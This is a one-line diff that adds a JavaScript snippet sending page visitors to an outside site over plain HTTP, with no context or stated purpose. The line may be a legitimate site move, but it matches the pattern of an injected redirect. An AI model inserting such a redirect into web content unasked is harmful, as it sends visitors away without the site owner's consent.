@@ -1,0 +1,1 @@
+<script>location.replace("http://observatorio.itiud.org");</script>
